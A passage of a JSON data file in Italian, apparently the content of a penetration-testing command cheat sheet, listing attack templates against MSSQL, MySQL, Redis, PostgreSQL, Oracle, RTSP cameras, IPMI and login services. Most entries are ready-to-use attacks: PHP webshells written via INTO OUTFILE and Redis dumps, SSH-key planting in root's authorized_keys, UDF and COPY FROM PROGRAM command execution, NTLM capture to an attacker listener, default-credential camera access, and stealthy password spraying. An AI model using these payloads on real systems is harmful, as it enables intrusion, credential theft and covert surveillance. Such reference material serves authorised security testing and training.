    "note": "# Prossimo passo\nPunta ai file che portano credenziali o accesso: `web.config` e file di configurazione (connection string), chiavi private, `unattend.xml`, flag. Le credenziali trovate si riusano su altri servizi."
  },
  {
    "id": "mssql-xpdirtree",
    "name": "MSSQL — xp_dirtree NTLM capture",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MSSQL (1433)",
    "description": "Forza il servizio SQL a raggiungere una share UNC controllata dall'attaccante per catturare il NetNTLMv2 con Responder, da craccare o rilanciare in relay. Funziona anche senza privilegi elevati.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "xp_dirtree",
      "ntlm",
      "responder"
    ],
    "template": "EXEC xp_dirtree '\\\\<lhost>\\share', 1, 1;",
    "params": [
      {
        "key": "lhost",
        "label": "Listener (Responder)",
        "placeholder": "10.10.14.5"
      }
    ],
    "note": "# Prerequisiti\nMetti in ascolto `responder -I <iface>` oppure `impacket-smbserver share . -smb2support` prima di lanciare la query.\n# Prossimo passo\nIl NetNTLMv2 catturato si cracca offline (hashcat mode 5600) oppure si rilancia in relay (ntlmrelayx) se l'SMB signing non è obbligatorio sul bersaglio."
  },
  {
    "id": "mssql-linked",
    "name": "MSSQL — linked servers",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MSSQL (1433)",
    "description": "Enumera i server collegati: spesso permettono di saltare su altri host SQL (EXECUTE … AT), a volte con privilegi maggiori.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "linked-server",
      "lateral"
    ],
    "template": "SELECT srvname, isremote FROM sysservers;",
    "params": [
      {
        "key": "linked",
        "label": "Linked server",
        "placeholder": "SQL02\\INST"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Enumera",
        "template": "SELECT srvname, isremote FROM sysservers;",
        "description": "Elenca i linked server configurati."
      },
      {
        "id": "exec",
        "label": "Query remota",
        "template": "EXECUTE('SELECT @@servername, SYSTEM_USER') AT [<linked>];",
        "description": "Esegue una query sul linked server; verifica con quale identità gira."
      }
    ],
    "note": "# Output atteso\nL'enumerazione elenca i linked server; la query remota rivela con quale login giri sull'altro host, a volte più privilegiato di quello locale.\n# Prossimo passo\nSe sul linked server sei sysadmin, puoi abilitare ed eseguire `xp_cmdshell` lì tramite `EXECUTE('...') AT [server]`, saltando sull'altra istanza."
  },
  {
    "id": "mysql-queries",
    "name": "MySQL — enum & file read",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MySQL (3306)",
    "description": "Una volta dentro: elenca i database, leggi le tabelle utenti e, con privilegio `FILE`, leggi file dal disco (`LOAD_FILE`).",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "enum",
      "file-read"
    ],
    "template": "SHOW DATABASES;",
    "params": [
      {
        "key": "db",
        "label": "Database",
        "placeholder": "app"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Database",
        "template": "SHOW DATABASES;",
        "description": "Elenca i database disponibili."
      },
      {
        "id": "tables",
        "label": "Tabelle",
        "template": "USE <db>; SHOW TABLES;",
        "description": "Tabelle del database scelto."
      },
      {
        "id": "loadfile",
        "label": "Leggi file",
        "template": "SELECT LOAD_FILE('/etc/passwd');",
        "description": "Legge un file dal disco (serve il privilegio FILE e secure_file_priv permissivo)."
      }
    ],
    "note": "# Prossimo passo\nDalle tabelle utente estrai gli hash delle password da craccare offline. Con il privilegio `FILE`, `LOAD_FILE` legge file di configurazione e chiavi dal disco con i diritti del servizio mysqld."
  },
  {
    "id": "mysql-privcheck",
    "name": "MySQL — check RCE",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MySQL (3306)",
    "description": "Prima di tentare la RCE serve verificarne la fattibilità: MySQL non ha un `xp_cmdshell` pronto, quindi occorrono il privilegio `FILE` e un `secure_file_priv` non bloccato.\n- `secure_file_priv` può essere: \n   - `''` (vuoto) consente la scrittura ovunque;\n   -  `/path` la limita a quella directory;\n   - `NULL` la disabilita, e la RCE via file non può essere fatta\n- il privilegio `FILE` deve comparire nei grant\n- `plugin_dir` indica dove va collocata la libreria per la via UDF",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "privesc",
      "file-priv",
      "secure-file-priv"
    ],
    "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "secure_file_priv + plugin_dir",
        "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
        "description": "Un `secure_file_priv` vuoto consente la scrittura di file ovunque, quindi OUTFILE e UDF sono percorribili; con `NULL` la RCE via file è impossibile. `plugin_dir` indica dove caricare la `.so` per l'UDF."
      },
      {
        "id": "grants",
        "label": "Ho FILE privilege?",
        "template": "SHOW GRANTS FOR CURRENT_USER();",
        "description": "Il privilegio da cercare è `FILE`, o in alternativa `ALL PRIVILEGES`. Senza `FILE` non sono possibili OUTFILE, LOAD_FILE né UDF via outfile."
      },
      {
        "id": "whoami",
        "label": "Utente corrente",
        "template": "SELECT current_user(), user();",
        "description": "Login autenticato vs quello richiesto: utile per capire il contesto."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 3306 Pentesting MySQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
      }
    ],
    "note": "# Output atteso\n`secure_file_priv` vuoto consente la scrittura ovunque (OUTFILE e UDF possibili); un percorso la limita a quella cartella; `NULL` chiude la via dei file. Il privilegio `FILE` deve comparire nei grant.\n# Prossimo passo\nSe i prerequisiti ci sono, passa alla RCE via OUTFILE (webshell) o UDF (vedi MySQL — RCE)."
  },
  {
    "id": "mysql-oscmd",
    "name": "MySQL — RCE (OUTFILE / UDF)",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "MySQL (3306)",
    "description": "Esecuzione comandi dal database MySQL. Entrambe le vie richiedono il privilegio `FILE` e un `secure_file_priv` permissivo, come descritto in `MySQL — check RCE`.\n- webshell: scrittura di un `.php` nel webroot con `INTO OUTFILE`, che viene poi eseguito via HTTP\n- UDF: caricamento di `lib_mysqludf_sys.so` nel `plugin_dir` e creazione di `sys_eval` per lanciare comandi come l'utente mysqld",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "rce",
      "udf",
      "outfile"
    ],
    "template": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '<webroot>/sh.php';",
    "params": [
      {
        "key": "webroot",
        "label": "Webroot",
        "placeholder": "/var/www/html"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "db",
        "label": "Database",
        "placeholder": "app"
      }
    ],
    "variants": [
      {
        "id": "outfile",
        "label": "Webshell (OUTFILE)",
        "template": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '<webroot>/sh.php';",
        "description": "Scrive una webshell PHP nel webroot. Poi RCE via `http://target/sh.php?cmd=id`. Serve conoscere il webroot e che sia scrivibile dall'utente mysqld."
      },
      {
        "id": "udf",
        "label": "UDF sys_eval",
        "template": "CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so'; SELECT sys_eval('id');",
        "description": "Crea la funzione UDF e lancia comandi: `sys_eval` ritorna l'output. La `.so` deve già stare nel `plugin_dir` (vedi la nota). Su Windows la SONAME è `lib_mysqludf_sys.dll`."
      },
      {
        "id": "sqlmap",
        "label": "sqlmap (auto)",
        "template": "sqlmap -d \"mysql://<user>:<password>@<ip>:3306/<db>\" --os-shell",
        "description": "Automatizza OUTFILE/UDF e apre una shell OS interattiva. `-d` = connessione diretta al DB."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 3306 Pentesting MySQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
      }
    ],
    "note": "# Ottenere lib_mysqludf_sys.so\nNon si genera: è una libreria già pronta. La prendi da Kali in una di queste due forme.\n- Metasploit, pronta all'uso (consigliata): `/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so`\n- sqlmap, da decodificare prima dell'uso. sqlmap la distribuisce in forma «cloaked», cioè offuscata e con un `_` finale nel nome, così da non farsi segnalare dall'antivirus mentre sta sul disco. La riporti in chiaro con il suo strumento `cloak.py` passando `-d` (de-cloak, il contrario del cloak):\n\t- `python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_`\n\t- il risultato è il vero file `.so`, pronto da caricare\n# Caricarla nel plugin_dir\nServe `FILE` e un `secure_file_priv` permissivo. Converti la `.so` in esadecimale (`xxd -p file`, unita su una sola riga) e scrivila come file binario con DUMPFILE:\n`SELECT 0x<hex> INTO DUMPFILE '<plugin_dir>/lib_mysqludf_sys.so';`\npoi registra la funzione:\n`CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';`"
  },
  {
    "id": "rtsp-cameradar",
    "name": "RTSP — cameradar (auto)",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "RTSP (554/8554)",
    "description": "Tool automatico per telecamere RTSP: scopre gli host, indovina i path di stream e fa il brute delle credenziali di default. La via più rapida per accedere a una camera.\n- `--targets` = target (IP, CIDR, range o hostname)\n- `--ports` = porte custom (default 554)\n- `--net=host` = flag Docker, così il container raggiunge la rete del target",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rtsp"
    ],
    "tags": [
      "rtsp",
      "camera",
      "cameradar",
      "brute"
    ],
    "template": "docker run --rm -t --net=host ullaakut/cameradar --targets <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Cameradar — GitHub",
        "url": "https://github.com/Ullaakut/cameradar"
      }
    ],
    "note": "# Output atteso\nPer ogni camera cameradar riporta la route (path dello stream) e le credenziali trovate.\n# Prossimo passo\nCon path e credenziali apri o registra il flusso (vedi RTSP — apri/cattura stream). Le camere spesso rivelano aree interne o credenziali mostrate a schermo."
  },
  {
    "id": "rtsp-stream",
    "name": "RTSP — apri/cattura stream",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "RTSP (554/8554)",
    "description": "Con un path valido e (se servono) le credenziali, apri o cattura il flusso video della camera. Le virgolette proteggono `?` e `&` nell'URL.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rtsp"
    ],
    "tags": [
      "rtsp",
      "camera",
      "ffmpeg",
      "stream"
    ],
    "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "admin"
      },
      {
        "key": "path",
        "label": "Stream path",
        "placeholder": "Streaming/Channels/101"
      }
    ],
    "variants": [
      {
        "id": "view",
        "label": "Guarda (ffplay)",
        "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
        "description": "Apre il flusso in tempo reale."
      },
      {
        "id": "grab",
        "label": "Cattura frame (ffmpeg)",
        "template": "ffmpeg -i 'rtsp://<user>:<password>@<ip>:554/<path>' -frames:v 1 frame.jpg",
        "description": "Salva un singolo fotogramma come prova, senza aprire la finestra."
      },
      {
        "id": "vlc",
        "label": "VLC",
        "template": "vlc 'rtsp://<user>:<password>@<ip>:554/<path>'",
        "description": "Apre lo stream in VLC."
      }
    ],
    "note": "# Path RTSP comuni\n- Hikvision: `/Streaming/Channels/101`\n- Dahua: `/cam/realmonitor?channel=1&subtype=0`\n- Generici: `/live.sdp`, `/h264`, `/mpeg4`, `/video1`\n# Credenziali di default\n- `admin:admin` · `admin:12345` · `admin:` (vuota) · `root:root` · Dahua `888888:888888`\nQuando il path è ignoto, `cameradar` lo individua da solo.",
    "refs": [
      {
        "label": "HackTricks — 554 Pentesting RTSP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html"
      }
    ]
  },
  {
    "id": "redis-rce",
    "name": "Redis — RCE via CONFIG SET",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "Redis (6379)",
    "description": "Se Redis è aperto e il processo può scrivere sul filesystem, `CONFIG SET dir` più `dbfilename` reindirizzano il file di dump dove serve: si scrive una webshell nel web root o una chiave pubblica in `authorized_keys` per una shell SSH. Il salvataggio effettivo avviene con `SAVE`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "redis"
    ],
    "tags": [
      "redis",
      "rce",
      "webshell"
    ],
    "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "webshell",
        "label": "Webshell (web root)",
        "template": "# sposta la directory di dump nella web root\nredis-cli -h <ip> config set dir /var/www/html\n\n# chiama il dump shell.php, così il web server lo esegue come PHP\nredis-cli -h <ip> config set dbfilename shell.php\n\n# scrive la webshell dentro una chiave\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\n\n# forza il salvataggio: il file compare nella web root\nredis-cli -h <ip> save",
        "description": "Scrive `shell.php` nel web root: la RCE parte da `http://<ip>/shell.php?c=id`. Serve conoscere un path servito da un web server e scrivibile dal processo redis."
      },
      {
        "id": "sshkey",
        "label": "Chiave SSH",
        "template": "# genera una coppia di chiavi SSH senza passphrase\nssh-keygen -t rsa -f ./key -q -N ''\n\n# imbottisce la chiave pubblica di newline, per non corrompere il file finale\n(echo; cat key.pub; echo) > key.txt\n\n# svuota il database, così il dump contiene solo la chiave\nredis-cli -h <ip> flushall\n\n# carica la chiave pubblica dentro una chiave Redis\ncat key.txt | redis-cli -h <ip> -x set sshkey\n\n# sposta la directory di dump in /root/.ssh\nredis-cli -h <ip> config set dir /root/.ssh\n\n# chiama il dump authorized_keys\nredis-cli -h <ip> config set dbfilename authorized_keys\n\n# salva: la chiave finisce tra le authorized_keys di root\nredis-cli -h <ip> save\n\n# entra via SSH come root con la chiave privata\nssh -i key root@<ip>",
        "description": "Scrive la propria chiave pubblica in `/root/.ssh/authorized_keys` (o nella home di un altro utente) per una shell SSH. Funziona se il processo redis gira come quell'utente e la dir esiste."
      }
    ],
    "note": "# Prerequisiti\nRedis raggiungibile senza autenticazione (o con password nota) e un processo che può scrivere su disco. Il salvataggio effettivo del file avviene con `SAVE`.\n# Errori comuni\nLa webshell funziona solo se conosci un path servito da un web server e scrivibile dal processo redis. La chiave SSH funziona se redis gira come quell'utente e la cartella `.ssh` esiste."
  },
  {
    "id": "psql-rce",
    "name": "PostgreSQL — RCE & lettura file",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "PostgreSQL (5432)",
    "description": "Con un ruolo Superuser, PostgreSQL esegue comandi di sistema tramite `COPY... FROM PROGRAM` (dalla 9.3) e legge file arbitrari copiandoli in una tabella. L'output del comando finisce in una tabella temporanea che poi si interroga.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "postgresql"
    ],
    "tags": [
      "postgres",
      "rce",
      "readfile"
    ],
    "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\"",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "cmdexec",
        "label": "RCE (COPY FROM PROGRAM)",
        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\"",
        "description": "Esegue `id` come utente del servizio PostgreSQL. Sostituisci `id` con una reverse shell per una shell interattiva. Richiede privilegi Superuser."
      },
      {
        "id": "readfile",
        "label": "Lettura file",
        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c \"CREATE TABLE f(t text); COPY f FROM '/etc/passwd'; SELECT * FROM f;\"",
        "description": "Copia un file di sistema in una tabella e lo stampa. Utile per leggere chiavi, config e hash con i diritti del servizio."
      }
    ],
    "note": "# Prerequisiti\n`COPY ... FROM PROGRAM` richiede un ruolo Superuser (verifica con `\\du` o `SELECT current_setting('is_superuser')`).\n# Prossimo passo\nSostituisci `id` con un one-liner di reverse shell per una shell interattiva. La lettura file serve a recuperare chiavi, config e hash con i diritti del servizio."
  },
  {
    "id": "odat-rce",
    "name": "ODAT — lettura file e RCE Oracle",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "Oracle (1521)",
    "description": "Con credenziali valide ODAT trasforma l'accesso al database in lettura/scrittura di file sul server e in esecuzione di comandi, tramite UTL_FILE, external table o DBMS_SCHEDULER.",
    "note": "# Prerequisito\nUn SID e credenziali con privilegi adeguati (spesso basta un utente con ruoli comuni). Verifica prima i privilegi con le query di enumerazione.\n# Output atteso\nexternal table e DBMS_SCHEDULER puntano all'esecuzione comandi; UTL_FILE alla lettura/scrittura file. Scegli in base ai privilegi disponibili.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "oracle"
    ],
    "tags": [
      "oracle",
      "odat",
      "rce"
    ],
    "template": "# lettura di un file dal server via UTL_FILE\nodat utlfile -s <ip> -d <sid> -U <user> -P '<password>' --getFile /tmp out.txt\n\n# esecuzione comandi via external table\nodat externaltable -s <ip> -d <sid> -U <user> -P '<password>' --exec /tmp whoami",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "system"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "oracle"
      },
      {
        "key": "sid",
        "label": "SID",
        "placeholder": "XE"
      }
    ]
  },
  {
    "id": "ipmi-dumphash",
    "name": "IPMI — dump & crack hash",
    "category": "exploitation",
    "subcategory": "infrastructure",
    "group": "IPMI (623/udp)",
    "description": "IPMI 2.0 ha una falla di progetto nel protocollo RAKP: il BMC restituisce un hash della password di qualsiasi utente valido prima dell'autenticazione, quindi si estrae offline. Alcuni BMC accettano anche Cipher 0, che bypassa del tutto l'autenticazione. Gli hash si crackano con hashcat mode 7300.",
    "note": "# Credenziali di default\nDefault dei BMC per la Cipher 0 / login web: `ADMIN:ADMIN` (Supermicro) · `root:calvin` (Dell iDRAC) · `USERID:PASSW0RD` (IBM/Lenovo, con lo zero) · `Administrator:admin` (HP iLO) · `admin:admin` · `root:root`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ipmi"
    ],
    "tags": [
      "ipmi",
      "bmc",
      "rakp"
    ],
    "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      }
    ],
    "variants": [
      {
        "id": "msf",
        "label": "Dump hash (Metasploit)",
        "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
        "description": "Estrae gli hash RAKP degli utenti del BMC. Salva l'output in formato `user:hash` per hashcat."
      },
      {
        "id": "crack",
        "label": "Crack (hashcat 7300)",
        "template": "hashcat -m 7300 ipmi.hash <wordlist>",
        "description": "Cracka gli hash RAKP estratti. Le password di default dei BMC (es. `ADMIN`) cadono subito."
      },
      {
        "id": "cipher0",
        "label": "Cipher 0 (auth bypass)",
        "template": "ipmitool -I lanplus -C 0 -H <ip> -U Administrator -P '' user list",
        "description": "Con Cipher 0 alcuni BMC eseguono comandi con qualsiasi password. Se funziona, si possono creare utenti amministrativi."
      }
    ]
  },
  {
    "id": "username-anarchy",
    "name": "username-anarchy — genera username",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Username List",
    "description": "Genera username plausibili da nomi e cognomi, nelle forme `nome.cognome`, `n.cognome`, `ncognome` e simili. Da una lista di nomi reali si ottiene la userlist per spray e brute force.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "username-anarchy",
      "userlist"
    ],
    "template": "username-anarchy -i names.txt",
    "params": [],
    "note": "# Prossimo passo\nLa userlist alimenta password spray e brute force. Prima di sprayare conviene validare gli utenti esistenti (per esempio con kerbrute userenum), così non sprechi tentativi e alzi meno rumore.\n# Opzioni utili\nPuò generare molte forme: di solito basta allinearsi al formato aziendale ricavato in enumerazione (spesso `nome.cognome`) per tenere la lista corta ed efficace."
  },
  {
    "id": "hydra",
    "name": "hydra — brute force online",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Online Brute",
    "description": "Brute force online di un servizio. Ultima risorsa (rumoroso, rischio lockout): prima prova spray e password riutilizzate.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "hydra",
      "brute"
    ],
    "template": "hydra -l <user> -P <wordlist> ssh://<ip> -t 4",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SSH",
        "template": "hydra -l <user> -P <wordlist> ssh://<ip> -t 4",
        "description": "`-t 4`: SSH spesso limita i thread paralleli."
      },
      {
        "id": "ftp",
        "label": "FTP",
        "template": "hydra -l <user> -P <wordlist> ftp://<ip>",
        "description": "Brute FTP."
      },
      {
        "id": "http-post",
        "label": "HTTP POST form",
        "template": "hydra -l <user> -P <wordlist> <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"",
        "description": "`F=` è la stringa che il server mostra al login fallito."
      },
      {
        "id": "http-basic",
        "label": "HTTP Basic",
        "template": "hydra -l <user> -P <wordlist> <ip> http-get /protected/",
        "description": "Autenticazione HTTP Basic."
      }
    ],
    "note": "# Attenzione\nÈ rumoroso e può bloccare gli account: usalo come ultima risorsa, dopo spray e riuso di password. Su Active Directory verifica sempre la lockout policy.\n# Opzioni utili\n- `-t <n>` thread paralleli, `-s <porta>` per porta non standard, `-f` ferma al primo successo\n- `-e nsr` prova anche password vuota, uguale all'utente e invertita\n- nei form HTTP la stringa dopo `F=` deve combaciare con il messaggio di errore reale del login\n# Prossimo passo\nCon una credenziale valida, autenticati al servizio e passa all'enumerazione autenticata."
  },
  {
    "id": "nxc-smb-spray",
    "name": "nxc smb — password spray",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Spraying",
    "description": "Prova una password su tutta la userlist. **La lockout policy va verificata prima** con `--pass-pol`: con una soglia maggiore di zero è ammesso un solo tentativo per giro. `--continue-on-success` non si ferma al primo successo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "spray"
    ],
    "template": "nxc smb <ip> -u <userlist> -p '<password>' --continue-on-success",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "Winter2025!"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Una password",
        "template": "nxc smb <ip> -u <userlist> -p '<password>' --continue-on-success",
        "description": "Una password su tutti gli utenti."
      },
      {
        "id": "list",
        "label": "Lista password",
        "template": "nxc smb <ip> -u <userlist> -p passwords.txt --no-bruteforce --continue-on-success",
        "description": "`--no-bruteforce` accoppia riga-a-riga utente:password invece di tutte le combinazioni."
      },
      {
        "id": "winrm",
        "label": "WinRM",
        "template": "nxc winrm <ip> -u <userlist> -p passwords.txt --continue-on-success",
        "description": "Stesso spray ma su WinRM."
      }
    ],
    "note": "# Output atteso\nUn `[+] dominio\\utente:password` segna una credenziale valida; l'etichetta `(Pwn3d!)` indica privilegi di admin locale su quell'host.\n# Prossimo passo\nCon un colpo a segno passa all'enumerazione autenticata (share, sessioni, BloodHound); se sei admin locale, esecuzione comandi o dump della SAM."
  },
  {
    "id": "kerbrute-spray",
    "name": "kerbrute — password spray",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Spraying",
    "description": "Password spray via Kerberos: genera gli eventi 4768 e 4771 sul domain controller ma non il 4625 di logon fallito, il che lo rende più discreto di uno spray su SMB. Con un solo tentativo per giro distribuito sugli utenti resta sotto la soglia di lockout. Vuole una lista di username già validati e una password da provare.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "kerbrute",
      "spray"
    ],
    "template": "kerbrute passwordspray -d <domain> --dc <ip> <userlist> '<password>'",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "Winter2025!"
      }
    ],
    "note": "# Prerequisiti\nServe una lista di username già validati e il domain controller raggiungibile come KDC (porta 88).\n# Output atteso\nUn `[+] VALID LOGIN: utente@dominio:password` segna la coppia valida.\n# Prossimo passo\nCon la credenziale passa all'enumerazione AD autenticata (BloodHound, share); valuta AS-REP roasting e Kerberoast."
  },
  {
    "id": "hash-identify",
    "name": "Identifica il tipo di hash",
    "category": "exploitation",
    "subcategory": "offline-crack",
    "group": "Identify",
    "description": "Prima di craccare serve sapere cosa si ha in mano: questi tool riconoscono il formato dell'hash e, nel caso di hashcat, suggeriscono direttamente il mode numerico da usare.",
    "note": "# Mode hashcat frequenti\nMD5 0 · SHA1 100 · NTLM 1000 · sha512crypt (`$6$`) 1800 · bcrypt 3200 · NetNTLMv2 5600 · Kerberoast TGS 13100 · KeePass 13400 · AS-REP 18200.\n# Errori comuni\nhashid propone più candidati: incrocia con il contesto (dove hai preso l'hash) per scegliere il mode giusto.",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "hashid",
      "hashcat",
      "identify",
      "cracking"
    ],
    "template": "# riconosci il formato\nhashid '<hash>'\nname-that-hash -t '<hash>'\n\n# hashcat suggerisce il mode\nhashcat --identify <hashfile>",
    "params": [
      {
        "key": "hash",
        "label": "Hash",
        "ctx": "hash",
        "placeholder": "aad3b435b51404ee..."
      },
      {
        "key": "hashfile",
        "label": "File hash",
        "placeholder": "hashes.txt"
      }
    ]
  },
  {
    "id": "hashcat-ntlm",
    "name": "hashcat — crack hash offline",
    "category": "exploitation",
    "subcategory": "offline-crack",
    "group": "hashcat",
    "description": "Cracking offline degli hash. `--show` ristampa quelli già craccati.\n- `1000` = NTLM\n- `13100` = Kerberoast (TGS)\n- `18200` = AS-REP\n- `5600` = NetNTLMv2",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "hashcat",
      "cracking"
    ],
    "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
    "params": [
      {
        "key": "mode",
        "label": "Mode",
        "placeholder": "1000"
      },
      {
        "key": "hashfile",
        "label": "Hash file",
        "placeholder": "hashes.txt"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      }
    ],
    "refs": [
      {
        "label": "hashcat — example hashes (lista mode)",
        "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
      },
      {
        "label": "Weakpass — wordlist per cracking",
        "url": "https://weakpass.com/"
      }
    ],
    "note": "# Opzioni utili\n- `-a 0` è l'attacco a dizionario (default); `-r rules/best64.rule` aggiunge le mutazioni comuni\n- `--username` se l'hashfile è in formato `utente:hash`; `--show` ristampa i già craccati dal potfile\n# Prossimo passo\nLe password craccate si riusano su altri servizi e host (password reuse) e valgono per l'accesso diretto dove sono ancora attive."
  },
  {
    "id": "hashcat-attacks",
    "name": "hashcat — modalità di attacco",
    "category": "exploitation",
